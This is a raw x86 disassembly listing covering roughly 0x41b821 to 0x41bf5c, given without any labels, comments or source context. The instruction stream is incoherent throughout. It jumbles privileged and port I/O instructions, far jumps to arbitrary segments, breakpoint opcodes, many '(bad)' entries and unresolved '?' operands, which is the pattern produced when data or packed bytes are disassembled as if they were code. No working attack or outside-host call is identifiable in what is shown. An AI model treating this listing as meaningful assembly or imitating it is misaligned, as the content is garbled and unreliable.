  41b821:	icebp  
  41b822:	push   0x6ce13def
  41b827:	int3   
  41b828:	cmp    edi,edi
  41b82a:	pop    esi
  41b82b:	pop    es
  41b82c:	fdivr  QWORD PTR [esi+eiz*8]
  41b82f:	xchg   ah,al
  41b831:	sub    dh,bl
  41b833:	cmp    ecx,DWORD PTR [ebp-0x6d]
  41b836:	scas   al,BYTE PTR es:[edi]
  41b837:	mov    ?,WORD PTR ds:0x1948a6c4
  41b83d:	pop    ecx
  41b83e:	inc    esi
  41b83f:	jno    0x41b86a
  41b841:	pop    eax
  41b842:	lahf   
  41b843:	mov    ecx,0x4f63a2e8
  41b848:	sti    
  41b849:	lahf   
  41b84a:	stos   DWORD PTR es:[edi],eax
  41b84b:	lods   eax,DWORD PTR ds:[esi]
  41b84c:	pusha  
  41b84d:	lea    ebx,[ebx]
  41b84f:	int3   
  41b850:	je     0x41b838
  41b852:	sub    bl,bh
  41b854:	sbb    cl,ch
  41b856:	dec    edi
  41b857:	inc    edi
  41b858:	fadd   st,st(6)
  41b85a:	cwde   
  41b85b:	cwde   
  41b85c:	xchg   DWORD PTR [ecx+0x6df4c804],eax
  41b862:	sub    DWORD PTR [esi-0x79],eax
  41b865:	dec    edi
  41b866:	dec    ebp
  41b867:	or     DWORD PTR [ebx-0x3387aa74],0xeec31c09
  41b871:	mov    dh,0x48
  41b873:	stos   BYTE PTR es:[edi],al
  41b874:	cmp    eax,0x61160070
  41b879:	and    al,0x22
  41b87b:	xchg   dh,al
  41b87d:	inc    esi
  41b87e:	pop    ds
  41b87f:	jmp    0xfb13364c
  41b884:	mov    esi,0x96e91463
  41b889:	ins    BYTE PTR es:[edi],dx
  41b88a:	adc    DWORD PTR [eax-0x9],eax
  41b88d:	es jns 0x41b81a
  41b890:	sbb    eax,DWORD PTR [edi]
  41b892:	dec    BYTE PTR [edi-0x5947bda2]
  41b898:	pop    edx
  41b899:	cmp    eax,DWORD PTR [edx+eax*8+0x62]
  41b89d:	add    eax,0xc0d7d5d4
  41b8a2:	popf   
  41b8a3:	pusha  
  41b8a4:	fstp   TBYTE PTR [edx-0x5c31f057]
  41b8aa:	cld    
  41b8ab:	shl    BYTE PTR [edx-0x2155aafd],0xf0
  41b8b2:	(bad)  
  41b8b3:	cs in  eax,dx
  41b8b5:	rol    DWORD PTR [esi-0x21],1
  41b8b8:	jmp    0xc4aa:0xdcc2fa5e
  41b8bf:	jge    0x41b8c9
  41b8c1:	imul   edx,DWORD PTR [eax+0x1f],0x35
  41b8c5:	lock jbe 0x41b945
  41b8c8:	imul   edi,DWORD PTR [eax],0xfffffffe
  41b8cb:	in     al,dx
  41b8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8cd:	ret    
  41b8ce:	or     edi,DWORD PTR [edi]
  41b8d0:	sti    
  41b8d1:	(bad)  
  41b8d2:	stos   DWORD PTR es:[edi],eax
  41b8d3:	mov    ecx,0xef6d2833
  41b8d8:	adc    BYTE PTR [ebx+0x4ba268df],bh
  41b8de:	jle    0x41b90d
  41b8e0:	mov    esi,0x44b383e2
  41b8e5:	fs inc cx
  41b8e8:	loope  0x41b8de
  41b8ea:	add    cl,BYTE PTR [esi+ecx*1]
  41b8ed:	pop    edi
  41b8ee:	lock jbe 0x41b8ff
  41b8f1:	lods   eax,DWORD PTR ds:[esi]
  41b8f2:	xor    ebp,ecx
  41b8f4:	adc    edi,eax
  41b8f6:	cmp    al,0x9
  41b8f8:	pop    ss
  41b8f9:	hlt    
  41b8fa:	push   eax
  41b8fb:	addr16 sub al,0xfd
  41b8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8ff:	mov    DWORD PTR [eax-0x71],eax
  41b902:	xor    al,0x6a
  41b904:	loope  0x41b8e9
  41b906:	push   eax
  41b907:	int3   
  41b908:	shl    edx,1
  41b90a:	aas    
  41b90b:	ins    DWORD PTR es:[edi],dx
  41b90c:	sahf   
  41b90d:	sbb    eax,0x51643d9e
  41b912:	mov    eax,ds:0xf41ca39
  41b917:	scas   eax,DWORD PTR es:[edi]
  41b918:	add    cl,BYTE PTR [ebx+0x30e9fc55]
  41b91e:	add    al,BYTE PTR [eax]
  41b920:	add    dh,al
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx-0x3dd8deca]
  41b92f:	inc    esi
  41b930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b931:	lock out 0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b94d
  41b93a:	jmp    0x41b951
  41b93c:	ins    DWORD PTR es:[edi],dx
  41b93d:	loop   0x41b959
  41b93f:	icebp  
  41b940:	imul   DWORD PTR ds:0x411298b8
  41b946:	cdq    
  41b947:	shl    BYTE PTR [ebx],cl
  41b949:	(bad)  
  41b94a:	jge    0x41b950
  41b94c:	pop    ebx
  41b94d:	push   0x31695afd
  41b952:	inc    esi
  41b953:	mov    cl,0x8f
  41b955:	sbb    eax,0x8fb4afa6
  41b95a:	sbb    al,0xf1
  41b95c:	or     eax,0xc16a6f5e
  41b961:	out    dx,eax
  41b962:	stos   BYTE PTR es:[edi],al
  41b963:	test   eax,0xe14ea766
  41b968:	sahf   
  41b969:	outs   dx,BYTE PTR ds:[esi]
  41b96a:	mov    edx,esp
  41b96c:	dec    esp
  41b96d:	push   esi
  41b96e:	ss stos BYTE PTR es:[edi],al
  41b970:	or     al,0x1e
  41b972:	test   eax,0xd6462f5b
  41b977:	or     DWORD PTR [ecx+0x59],edx
  41b97a:	icebp  
  41b97b:	adc    al,0x7a
  41b97d:	or     BYTE PTR [ebp-0x7b],bl
  41b980:	dec    ebp
  41b981:	(bad)  
  41b983:	push   edx
  41b984:	and    DWORD PTR [ecx-0x13],edi
  41b987:	push   ebx
  41b988:	outs   dx,BYTE PTR ds:[esi]
  41b989:	jae    0x41b9c2
  41b98b:	cli    
  41b98c:	adc    eax,0xa4bdc6ae
  41b991:	outs   dx,BYTE PTR ds:[esi]
  41b992:	dec    ebx
  41b993:	jge    0x41b99c
  41b995:	ja     0x41b952
  41b997:	outs   dx,BYTE PTR ds:[esi]
  41b998:	fcmovb st,st(3)
  41b99a:	xchg   ecx,eax
  41b99b:	imul   ebx,DWORD PTR [ebx],0xffffff89
  41b99e:	ret    
  41b99f:	pop    esp
  41b9a0:	lds    eax,FWORD PTR [edi+0x25]
  41b9a3:	stos   BYTE PTR es:[edi],al
  41b9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9a5:	pop    es
  41b9a6:	lahf   
  41b9a7:	push   ss
  41b9a8:	mov    esp,0x5c1baec0
  41b9ad:	scas   eax,DWORD PTR es:[edi]
  41b9ae:	je     0x41ba27
  41b9b0:	cmp    esi,DWORD PTR ds:0x17a3528a
  41b9b6:	sahf   
  41b9b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9b8:	imul   esp,edi,0x2ecc5e56
  41b9be:	ret    
  41b9bf:	dec    ebx
  41b9c0:	das    
  41b9c1:	daa    
  41b9c2:	iret   
  41b9c3:	or     BYTE PTR [edx-0x26],ch
  41b9c6:	gs push ss
  41b9c8:	mov    ds:0x4387754c,al
  41b9cd:	rcr    DWORD PTR [esp+ecx*2-0x2c],1
  41b9d1:	adc    eax,0xe311bf4a
  41b9d6:	add    al,0xcc
  41b9d8:	dec    ecx
  41b9d9:	je     0x41b9e1
  41b9db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9dc:	xor    eax,0x2450e76c
  41b9e1:	xor    BYTE PTR [eax+ebx*8+0x51],bh
  41b9e5:	daa    
  41b9e6:	xchg   ebx,eax
  41b9e7:	pusha  
  41b9e8:	bswap  ebp
  41b9ea:	xor    bl,BYTE PTR [edi]
  41b9ec:	adc    eax,0xa36b4a08
  41b9f1:	add    al,0x8a
  41b9f3:	pop    edx
  41b9f4:	inc    esi
  41b9f5:	cmp    BYTE PTR [edx+0x51eaeabc],al
  41b9fb:	or     al,0x66
  41b9fd:	aas    
  41b9fe:	inc    ecx
  41b9ff:	xchg   ecx,eax
  41ba00:	icebp  
  41ba01:	jo     0x41ba40
  41ba03:	mov    edx,0x64bccc11
  41ba08:	mov    cl,dh
  41ba0a:	push   0xffffffe1
  41ba0c:	dec    edx
  41ba0d:	xor    dh,dl
  41ba0f:	dec    ebp
  41ba10:	ja     0x41ba03
  41ba12:	inc    edi
  41ba13:	dec    eax
  41ba14:	nop
  41ba15:	pop    es
  41ba16:	sub    ecx,ebp
  41ba18:	ins    DWORD PTR es:[edi],dx
  41ba19:	mov    edx,0x55563004
  41ba1e:	inc    ecx
  41ba1f:	repz dec esp
  41ba21:	pop    eax
  41ba22:	mov    al,ds:0x24ddadc7
  41ba27:	push   ds
  41ba28:	xchg   edx,eax
  41ba29:	mov    ds:0x401cfa7b,eax
  41ba2e:	test   BYTE PTR [ebx-0x52],0x98
  41ba32:	mov    ?,WORD PTR [edx+0x2ce78e60]
  41ba38:	mov    al,0x1a
  41ba3a:	daa    
  41ba3b:	clc    
  41ba3c:	retf   0x4c1e
  41ba3f:	call   0x301dbf82
  41ba44:	jg     0x41ba5f
  41ba46:	xlat   BYTE PTR ds:[ebx]
  41ba47:	cmp    BYTE PTR [esi],0xc9
  41ba4a:	xchg   ebp,eax
  41ba4b:	sbb    BYTE PTR cs:[ebp+0x74],ch
  41ba4f:	in     al,dx
  41ba50:	leave  
  41ba51:	loope  0x41baa8
  41ba53:	outs   dx,DWORD PTR ds:[esi]
  41ba54:	mov    esp,0x6dcdd516
  41ba59:	sti    
  41ba5a:	mov    bl,0x9c
  41ba5c:	scas   al,BYTE PTR es:[edi]
  41ba5d:	mov    al,ds:0x1ea714d8
  41ba62:	push   ss
  41ba63:	outs   dx,DWORD PTR ds:[esi]
  41ba64:	jnp    0x41ba49
  41ba66:	fst    QWORD PTR [ebp-0x314d147e]
  41ba6c:	mov    bl,bh
  41ba6e:	dec    esi
  41ba6f:	or     BYTE PTR [ebp+0x1281b90f],0xbb
  41ba76:	arpl   ax,sp
  41ba78:	repnz and BYTE PTR [ecx+0x364b0b54],0x2f
  41ba80:	and    eax,0xdb4fd0dd
  41ba85:	cwde   
  41ba86:	adc    DWORD PTR [ebp-0x55737256],ebp
  41ba8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba8d:	es ss (bad) 
  41ba90:	xor    al,0x22
  41ba92:	pop    edx
  41ba93:	jnp    0x41ba7b
  41ba95:	test   DWORD PTR [edx-0x6a120b95],0x43769323
  41ba9f:	jo     0x41badc
  41baa1:	lods   eax,DWORD PTR ds:[esi]
  41baa2:	xor    DWORD PTR [ebx+0x27],0xc625d2ce
  41baa9:	call   0xc14:0x4a35bc11
  41bab0:	ret    
  41bab1:	std    
  41bab2:	sub    bh,BYTE PTR [ecx+0x36]
  41bab5:	or     eax,0xe3dbe966
  41baba:	adc    eax,0xf32400dc
  41babf:	or     al,0x23
  41bac1:	mov    WORD PTR [ebx],?
  41bac3:	cmp    eax,0xfc2ff374
  41bac8:	push   ecx
  41bac9:	sub    al,0x14
  41bacb:	loope  0x41ba72
  41bacd:	mov    ebx,0xc3f867ca
  41bad2:	adc    al,0x8b
  41bad4:	scas   eax,DWORD PTR es:[edi]
  41bad5:	pop    ebp
  41bad6:	cs das 
  41bad8:	jl     0x41bb00
  41bada:	fcmovne st,st(7)
  41badc:	jnp    0x41babf
  41bade:	jmp    0x2601a9f
  41bae3:	rcl    DWORD PTR [ebx],1
  41bae5:	jb     0x41bb13
  41bae7:	pop    ss
  41bae8:	dec    ebx
  41bae9:	xchg   BYTE PTR [edi],dl
  41baeb:	cmp    eax,0x644eb1f
  41baf0:	adc    BYTE PTR [ecx],ah
  41baf2:	repnz push esi
  41baf4:	and    eax,0x4ff23358
  41baf9:	xchg   edi,eax
  41bafa:	sbb    eax,0x6490d859
  41baff:	or     esp,DWORD PTR [esi-0x6b169e28]
  41bb05:	cmovs  edi,DWORD PTR [ebx]
  41bb08:	xchg   BYTE PTR [ebp+0x38d461],cl
  41bb0e:	or     ecx,DWORD PTR [esp+eax*8]
  41bb11:	in     eax,dx
  41bb12:	mov    ebx,DWORD PTR [esi]
  41bb14:	outs   dx,DWORD PTR ds:[esi]
  41bb15:	out    dx,al
  41bb16:	jns    0x41baeb
  41bb18:	rcr    esp,1
  41bb1a:	sti    
  41bb1b:	ins    BYTE PTR es:[edi],dx
  41bb1c:	xlat   BYTE PTR ds:[ebx]
  41bb1d:	js     0x41bb6e
  41bb1f:	ror    DWORD PTR ds:0xa05ff988,1
  41bb25:	js     0x41bba2
  41bb27:	fwait
  41bb28:	ss dec dh
  41bb2b:	adc    DWORD PTR [edi-0x28],esi
  41bb2e:	mov    ch,0x3e
  41bb30:	and    DWORD PTR [edi+0x5c],0x50
  41bb34:	mov    bh,0xa4
  41bb36:	cli    
  41bb37:	dec    edx
  41bb38:	aam    0x23
  41bb3a:	js     0x41bac9
  41bb3c:	push   0xa3b69573
  41bb41:	jmp    0x1d51:0x45f0bb6
  41bb48:	mov    eax,ds:0x8ca0ae21
  41bb4d:	mov    dh,0x33
  41bb4f:	and    al,0x4f
  41bb51:	xor    edx,ecx
  41bb53:	jmp    0x41bd88
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0x1a17bf12
  41bb65:	jle    0x41bb25
  41bb67:	cdq    
  41bb68:	mov    ah,ah
  41bb6a:	jg     0x41bbe4
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41baf7
  41bb71:	mov    eax,ds:0xeb01b500
  41bb76:	jmp    0xf951239e
  41bb7b:	and    ecx,edi
  41bb7d:	jbe    0x41bb56
  41bb7f:	push   edx
  41bb80:	mov    BYTE PTR [edi+0x12e4b93f],ch
  41bb86:	lock out 0x85,eax
  41bb89:	in     al,0x6b
  41bb8b:	(bad)  
  41bb8d:	sbb    eax,DWORD PTR [ecx*2+0x796f997b]
  41bb94:	or     eax,0x5c947a08
  41bb99:	or     al,0xc9
  41bb9b:	hlt    
  41bb9c:	jnp    0x41bbce
  41bb9e:	xor    DWORD PTR [eax],ebx
  41bba0:	dec    ebp
  41bba1:	mov    ds:0xa18ef1a5,al
  41bba6:	out    0xe,eax
  41bba8:	aam    0xe
  41bbaa:	rol    bh,cl
  41bbac:	xor    cl,0x44
  41bbaf:	int3   
  41bbb0:	xor    BYTE PTR [esi+0x4b],bl
  41bbb3:	dec    esp
  41bbb4:	addr16 (bad) 
  41bbb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbb7:	scas   eax,DWORD PTR es:[edi]
  41bbb8:	jmp    0x8e6c4a6f
  41bbbd:	ficom  WORD PTR [esi+eiz*2]
  41bbc0:	inc    ecx
  41bbc1:	stos   DWORD PTR es:[edi],eax
  41bbc2:	addr16 mov edx,0x456078d0
  41bbc8:	jmp    FWORD PTR [edx-0x2]
  41bbcb:	retf   
  41bbcc:	push   ss
  41bbcd:	out    dx,al
  41bbce:	in     eax,dx
  41bbcf:	mov    al,0xc0
  41bbd1:	push   eax
  41bbd2:	idiv   ecx
  41bbd4:	fbstp  TBYTE PTR [edx-0x7a]
  41bbd7:	out    0x97,eax
  41bbd9:	test   al,0x4
  41bbdb:	(bad)  
  41bbdc:	xchg   DWORD PTR [eax],ebx
  41bbde:	and    al,0x15
  41bbe0:	ja     0x41bbe5
  41bbe2:	mov    edx,cs
  41bbe4:	add    DWORD PTR [edi-0x108c57d],0xffffffac
  41bbeb:	dec    esp
  41bbec:	mov    ds:0xefc17d9f,al
  41bbf1:	push   0x4d6d6d9
  41bbf6:	and    eax,0x6e0179c4
  41bbfb:	cmc    
  41bbfc:	dec    edi
  41bbfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbfe:	jo     0x41bbc5
  41bc00:	clc    
  41bc01:	in     al,dx
  41bc02:	dec    esp
  41bc03:	adc    DWORD PTR [edi+0x76],0xffffffd8
  41bc07:	aad    0xc8
  41bc09:	call   0xcc43:0xe9b48b9d
  41bc10:	lock imul eax,ecx,0x28347d81
  41bc17:	pop    ds
  41bc18:	popa   
  41bc19:	push   ebx
  41bc1a:	sub    DWORD PTR ds:0x42cc2f26,ebx
  41bc20:	adc    BYTE PTR [ebp-0x6b009ba4],dl
  41bc26:	push   edx
  41bc27:	adc    eax,0xb423b08
  41bc2c:	fs xor al,0xb6
  41bc2f:	std    
  41bc30:	add    BYTE PTR [esp+ebp*8],ch
  41bc33:	fadd   DWORD PTR [edi-0x18]
  41bc36:	jo     0x41bc2c
  41bc38:	push   ds
  41bc39:	xchg   edi,eax
  41bc3a:	not    DWORD PTR [ebp-0x6f]
  41bc3d:	pop    eax
  41bc3e:	jno    0x41bcb8
  41bc40:	data16 cmp al,0x1
  41bc43:	jecxz  0x41bc3b
  41bc45:	sbb    BYTE PTR [edx-0x10],dh
  41bc48:	and    eax,DWORD PTR [ecx-0x54c7c785]
  41bc4e:	mov    al,ds:0x7510b04c
  41bc53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc54:	sub    al,0xfe
  41bc56:	mov    bl,0x9f
  41bc58:	add    al,0xf7
  41bc5a:	or     ah,dl
  41bc5c:	lahf   
  41bc5d:	and    edx,edi
  41bc5f:	push   es
  41bc60:	xchg   edi,eax
  41bc61:	dec    ebx
  41bc62:	js     0x41bc7f
  41bc64:	sbb    al,0x11
  41bc66:	xchg   ecx,eax
  41bc67:	cli    
  41bc68:	mov    ebx,DWORD PTR [ebp+0x62731afd]
  41bc6e:	repz out dx,al
  41bc70:	pop    edi
  41bc71:	xor    dh,BYTE PTR [edx]
  41bc73:	mov    ebx,0x706acdbc
  41bc78:	cld    
  41bc79:	fwait
  41bc7a:	sar    DWORD PTR [edi-0x643838e8],0x5
  41bc81:	stc    
  41bc82:	jmp    0xb69f:0x8e6cc94c
  41bc89:	loope  0x41bcd1
  41bc8b:	xor    al,0x0
  41bc8d:	pop    es
  41bc8e:	adc    dh,BYTE PTR [ebx-0x276fb209]
  41bc94:	scas   eax,DWORD PTR es:[edi]
  41bc95:	jnp    0x41bcd9
  41bc97:	and    eax,DWORD PTR [edi]
  41bc99:	into   
  41bc9a:	sbb    ebx,edi
  41bc9c:	xchg   esi,eax
  41bc9d:	sbb    BYTE PTR [edi+0x5b],0x66
  41bca1:	mov    WORD PTR [esi],cs
  41bca3:	ret    0x4dae
  41bca6:	and    ebp,DWORD PTR [esi]
  41bca8:	aam    0xcc
  41bcaa:	pushf  
  41bcab:	xchg   ecx,eax
  41bcac:	sub    eax,0x50ea1382
  41bcb1:	lods   al,BYTE PTR ds:[esi]
  41bcb2:	fcom   QWORD PTR [esi]
  41bcb4:	dec    esi
  41bcb5:	xchg   DWORD PTR [edi-0x3751a1b2],ecx
  41bcbb:	popf   
  41bcbc:	nop
  41bcbd:	nop
  41bcbe:	pusha  
  41bcbf:	sub    BYTE PTR ds:0xa8e118db,dl
  41bcc5:	test   al,0xa2
  41bcc7:	sbb    al,0x32
  41bcc9:	mov    esi,0x2f88fe2e
  41bcce:	gs sub al,0xac
  41bcd1:	(bad)  
  41bcd2:	push   esp
  41bcd3:	push   ecx
  41bcd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcd5:	bound  ecx,QWORD PTR [ebp-0x69]
  41bcd8:	add    BYTE PTR [eax+eiz*2+0x59ab8dac],cl
  41bcdf:	wrmsr  
  41bce1:	mov    ecx,0x147fd859
  41bce6:	ja     0x41bcbb
  41bce8:	repz mov bh,0x9
  41bceb:	test   dh,0xcd
  41bcee:	mov    al,0xff
  41bcf0:	mov    cl,0x4b
  41bcf2:	leave  
  41bcf3:	sub    esp,DWORD PTR [edi+0x1e]
  41bcf6:	ror    BYTE PTR [ecx],1
  41bcf8:	push   ss
  41bcf9:	mov    cl,0x9d
  41bcfb:	lods   al,BYTE PTR ds:[esi]
  41bcfc:	aam    0xc
  41bcfe:	and    DWORD PTR [esi+0x6b2e560f],ebx
  41bd04:	fiadd  WORD PTR [ebx-0x6e3c108b]
  41bd0a:	lahf   
  41bd0b:	sbb    al,0x4d
  41bd0d:	pop    ebx
  41bd0e:	or     DWORD PTR [eax+eiz*8-0x5b],0x12
  41bd13:	out    0x80,eax
  41bd15:	or     ecx,esi
  41bd17:	or     eax,0xd0f0efa0
  41bd1c:	in     eax,0x1c
  41bd1e:	in     eax,dx
  41bd1f:	xchg   DWORD PTR [ebx-0x3f456af8],edx
  41bd25:	jne    0x41bcbb
  41bd27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd28:	aad    0x4e
  41bd2a:	cld    
  41bd2b:	aad    0x80
  41bd2d:	inc    ebx
  41bd2e:	call   0x3d66:0xc3bfa7a0
  41bd35:	pop    edx
  41bd36:	jno    0x41bd4b
  41bd38:	sti    
  41bd39:	pop    ds
  41bd3a:	xchg   dl,ch
  41bd3c:	rcr    esp,1
  41bd3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd3f:	pop    ebx
  41bd40:	xlat   BYTE PTR ds:[ebx]
  41bd41:	pop    ecx
  41bd42:	int    0x90
  41bd44:	mov    ah,0xfe
  41bd46:	mov    ch,BYTE PTR [ecx-0x4b]
  41bd49:	outs   dx,DWORD PTR ds:[esi]
  41bd4a:	sahf   
  41bd4b:	xchg   BYTE PTR [edx],cl
  41bd4d:	pop    esi
  41bd4e:	mov    eax,0x322d1e4b
  41bd53:	aas    
  41bd54:	mov    ds:0xb2860012,eax
  41bd59:	aas    
  41bd5a:	hlt    
  41bd5b:	mov    bh,0xe7
  41bd5d:	stos   BYTE PTR es:[edi],al
  41bd5e:	ret    0xbca6
  41bd61:	out    0x50,al
  41bd63:	mov    ah,0xd
  41bd65:	leave  
  41bd66:	ja     0x41bdbc
  41bd68:	out    0x2c,al
  41bd6a:	inc    edi
  41bd6b:	scas   eax,DWORD PTR es:[edi]
  41bd6c:	fwait
  41bd6d:	popa   
  41bd6e:	aas    
  41bd6f:	sbb    DWORD PTR [ebx+0x2b99eb1e],esi
  41bd75:	mov    ch,0x5e
  41bd77:	or     al,0xbe
  41bd79:	dec    ecx
  41bd7a:	jae    0x41bda8
  41bd7c:	and    ebp,DWORD PTR es:[edx-0x38]
  41bd80:	xchg   esi,eax
  41bd81:	xor    ch,bh
  41bd83:	lahf   
  41bd84:	sbb    al,0x5a
  41bd86:	or     eax,esi
  41bd88:	mov    ecx,DWORD PTR [ebp+0x8]
  41bd8b:	jmp    0x41bfc0
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0x31
  41bd9d:	pop    esp
  41bd9e:	sbb    BYTE PTR [ecx-0x60],bl
  41bda1:	jmp    0x7878:0x7e10787f
  41bda8:	sub    eax,0x74438d54
  41bdad:	sbb    eax,DWORD PTR [ecx]
  41bdaf:	add    BYTE PTR [edx+0x38],bl
  41bdb2:	or     bh,dl
  41bdb4:	dec    edx
  41bdb5:	(bad)  
  41bdb6:	loope  0x41be29
  41bdb8:	std    
  41bdb9:	sbb    al,0x80
  41bdbb:	inc    esi
  41bdbc:	(bad)  
  41bdbd:	sbb    BYTE PTR [edi+0x3],ah
  41bdc0:	sahf   
  41bdc1:	or     eax,0x32e2e118
  41bdc6:	dec    esp
  41bdc7:	fidiv  WORD PTR [ebx-0x80]
  41bdca:	inc    esp
  41bdcb:	mov    ebx,0x40b0ec2b
  41bdd0:	mov    BYTE PTR [esi-0x26],dh
  41bdd3:	ins    BYTE PTR es:[edi],dx
  41bdd4:	jl     0x41be1b
  41bdd6:	inc    ecx
  41bdd7:	jge    0x41bdc1
  41bdd9:	repnz fs retf 0x66cb
  41bdde:	pusha  
  41bddf:	data16 lock das 
  41bde2:	xor    eax,0xbc54a0ad
  41bde7:	pop    ebx
  41bde8:	jp     0x41bdf4
  41bdea:	mov    ch,0xce
  41bdec:	mov    al,ds:0x9f5275e8
  41bdf1:	add    DWORD PTR [ebx-0x77],eax
  41bdf4:	arpl   WORD PTR [ebx],bx
  41bdf6:	out    dx,eax
  41bdf7:	data16 js 0x41bde6
  41bdfa:	jns    0x41be04
  41bdfc:	fidiv  DWORD PTR [ecx-0x1b3f49fc]
  41be02:	popf   
  41be03:	ffree  st(2)
  41be05:	mov    gs,ecx
  41be07:	shr    BYTE PTR [esi+0x47fb70f0],0x56
  41be0e:	std    
  41be0f:	mov    al,0x46
  41be11:	js     0x41be66
  41be13:	pop    ebx
  41be14:	pushf  
  41be15:	aam    0xb5
  41be17:	cs adc al,0x8a
  41be1a:	push   esi
  41be1b:	mov    ch,0xa0
  41be1d:	adc    edx,DWORD PTR [edi+0x22]
  41be20:	sub    cl,ah
  41be22:	inc    ebx
  41be23:	xchg   eax,ebp
  41be25:	mov    bl,0x50
  41be27:	mov    ch,0x90
  41be29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be2a:	cdq    
  41be2b:	push   eax
  41be2c:	sbb    DWORD PTR [ecx],ecx
  41be2e:	mov    ds:0xc7214546,eax
  41be33:	cmc    
  41be34:	mov    edi,0x6d2f4a89
  41be39:	aas    
  41be3a:	sub    bh,bh
  41be3c:	sbb    BYTE PTR [eax],dl
  41be3e:	and    edi,edi
  41be40:	lods   al,BYTE PTR ds:[esi]
  41be41:	jnp    0x41bdd8
  41be43:	in     eax,dx
  41be44:	in     al,0x10
  41be46:	fidivr WORD PTR [edi-0x3d]
  41be49:	mov    edx,edx
  41be4b:	or     al,0x53
  41be4d:	out    dx,al
  41be4e:	popf   
  41be4f:	mov    DWORD PTR gs:[edx+edx*4-0x52a5fda4],esp
  41be57:	xor    ebx,DWORD PTR [ebp-0x3a]
  41be5a:	sub    al,0xbf
  41be5c:	or     ebx,DWORD PTR [esi+0x488e2fa7]
  41be62:	les    ebx,FWORD PTR [edi+0x49923cdb]
  41be68:	fisubr WORD PTR [esp+edi*1]
  41be6b:	sahf   
  41be6c:	test   esp,0xab0f49be
  41be72:	out    0x88,al
  41be74:	mov    cl,BYTE PTR [edi]
  41be76:	jp     0x41be2d
  41be78:	shr    DWORD PTR [edx+edx*2+0x17],1
  41be7c:	sub    al,0xaa
  41be7e:	mov    ebp,0xdf5e9b62
  41be83:	sbb    DWORD PTR [edi+0x7bb89bf],esi
  41be89:	lahf   
  41be8a:	in     eax,0x5f
  41be8c:	call   0xa48dc869
  41be91:	lahf   
  41be92:	mov    cl,0xdc
  41be94:	(bad)  
  41be95:	stc    
  41be96:	lods   al,BYTE PTR ds:[esi]
  41be97:	dec    ecx
  41be98:	or     eax,0xddd6904f
  41be9d:	mov    edx,0xd7cfa0b9
  41bea2:	mov    al,ds:0xca1833c2
  41bea7:	jo     0x41bf0d
  41bea9:	push   esi
  41beaa:	or     eax,DWORD PTR [ecx-0x47359822]
  41beb0:	bound  ebp,QWORD PTR [ebx-0x4d69d5f2]
  41beb6:	jmp    0x41bebd
  41beb8:	scas   eax,DWORD PTR es:[edi]
  41beb9:	into   
  41beba:	cmp    al,0x81
  41bebc:	repnz in al,0x9a
  41bebf:	sar    DWORD PTR [ebx+0x4f4e659f],cl
  41bec5:	cli    
  41bec6:	iret   
  41bec7:	add    BYTE PTR [edx+edi*2-0x75b3f61a],dh
  41bece:	mov    ebp,0x152966e1
  41bed3:	cmp    dh,BYTE PTR [edx+0x7cef8fe5]
  41bed9:	shl    DWORD PTR [edi+0x78],1
  41bedc:	call   0xce81:0x46da3c86
  41bee3:	adc    ebx,DWORD PTR [ebp+esi*4+0x28dc1c4d]
  41beea:	out    dx,eax
  41beeb:	sub    dl,ch
  41beed:	sti    
  41beee:	or     DWORD PTR [ebx+0x2f],ebp
  41bef1:	test   cl,bh
  41bef3:	in     al,0x5b
  41bef5:	retf   0xe9b1
  41bef8:	inc    edx
  41bef9:	stos   DWORD PTR es:[edi],eax
  41befa:	call   0x3d71:0x8ab0974f
  41bf01:	stos   BYTE PTR es:[edi],al
  41bf02:	loope  0x41bf7d
  41bf04:	push   edx
  41bf05:	jg     0x41bf2b
  41bf07:	pop    esi
  41bf08:	lahf   
  41bf09:	icebp  
  41bf0a:	sahf   
  41bf0b:	mov    DWORD PTR [esi+0x5a8ebfda],edi
  41bf11:	inc    esi
  41bf12:	jo     0x41bf93
  41bf14:	cs cdq 
  41bf16:	(bad)  
  41bf17:	xor    eax,0x6abeaf06
  41bf1c:	and    edx,DWORD PTR [ebp+0x58855aec]
  41bf22:	cmp    dl,BYTE PTR [edx-0x7e]
  41bf25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf26:	cld    
  41bf27:	fisub  WORD PTR [edx]
  41bf29:	or     esi,DWORD PTR ds:0x8fc3fdc6
  41bf2f:	rcl    ah,cl
  41bf31:	leave  
  41bf32:	add    eax,0x74212c1a
  41bf37:	in     al,0x7f
  41bf39:	call   0xa95a:0x2d864719
  41bf40:	adc    BYTE PTR [edx],ah
  41bf42:	pop    ss
  41bf43:	adc    ecx,DWORD PTR [ebp+0x256ab490]
  41bf49:	inc    ebx
  41bf4a:	enter  0x31d2,0x20
  41bf4e:	pushf  
  41bf4f:	or     eax,0xa6cc6a69
  41bf54:	inc    edx
  41bf55:	cld    
  41bf56:	sub    ch,bl
  41bf58:	xor    DWORD PTR [esi+0x3c],edx
  41bf5b:	aas    
  41bf5c:	shl    DWORD PTR [ebp+0x374aac7d],0x37
